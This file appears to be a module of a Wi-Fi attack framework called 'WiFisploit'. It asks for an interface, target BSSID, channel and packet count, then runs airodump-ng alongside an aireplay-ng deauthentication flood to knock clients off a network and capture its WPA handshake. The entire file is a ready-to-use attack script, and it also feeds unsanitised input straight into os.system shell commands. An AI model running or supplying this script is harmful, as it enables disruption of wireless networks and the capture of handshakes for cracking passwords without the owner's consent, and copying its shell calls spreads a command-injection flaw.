# WiFisploit\wsf\modules\captures\capture_handshake.py

import os
from pystyle import Colors, Colorate

gradient_colors = Colors.red_to_white

interface = input(Colorate.Horizontal(gradient_colors, "wsf (Interface) > ")).strip()
if interface.lower() == "back":
    quit()
else:
    print(Colorate.Horizontal(gradient_colors, f"Interface => {interface}"))

bssid = input(Colorate.Horizontal(gradient_colors, "wsf (BSSID) > ")).strip()
if bssid.lower() == "back":
    quit()
else:
    print(Colorate.Horizontal(gradient_colors, f"BSSID => {bssid}"))

channel_str = input(Colorate.Horizontal(gradient_colors, "wsf (Channel) > ")).strip()
if channel_str.lower() == "back":
    quit()
try:
    channel = int(channel_str)
except ValueError:
    print(Colorate.Horizontal(gradient_colors, "Invalid channel. Must be a number."))
    quit()
print(Colorate.Horizontal(gradient_colors, f"Channel => {channel}"))

packet_str = input(Colorate.Horizontal(gradient_colors, "wsf (Packets) > ")).strip()
if packet_str.lower() == "back":
    quit()
try:
    packet = int(packet_str)
except ValueError:
    print(Colorate.Horizontal(gradient_colors, "Invalid packets. Must be a number."))
    quit()
print(Colorate.Horizontal(gradient_colors, f"Packets => {packet}"))

path = input(Colorate.Horizontal(gradient_colors, "wsf (Path) > ")).strip()
if path.lower() == "back":
    quit()
else:
    print(Colorate.Horizontal(gradient_colors, f"Path => {path}"))

os.system(f"iwconfig {interface} channel {channel}")
os.system(
    f"xterm -geometry 120x35 -e airodump-ng {interface} --bssid {bssid} -c {channel} -w {path} | "
    f"xterm -geometry 120x35 -e aireplay-ng --deauth {packet} -a {bssid} {interface}"
)